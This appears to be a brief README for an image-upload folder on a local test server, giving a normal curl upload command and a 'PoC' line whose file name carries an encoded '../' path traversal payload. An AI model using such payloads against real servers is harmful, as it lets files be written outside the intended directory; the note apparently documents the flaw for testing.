Folder /uploads for uploaded images

To successfully execute the curl command and upload an image, navigate to the /uploads directory in your terminal and then run the command: curl -X POST -F "image=@honeybunny.png" http://localhost:3000/upload. This ensures that the image file is referenced correctly and can be properly processed and saved by the server in the specified directory.

PoC : curl -X POST -F "image=@%2e%2e%2fhoneybinny.png" http://localhost:3000/upload
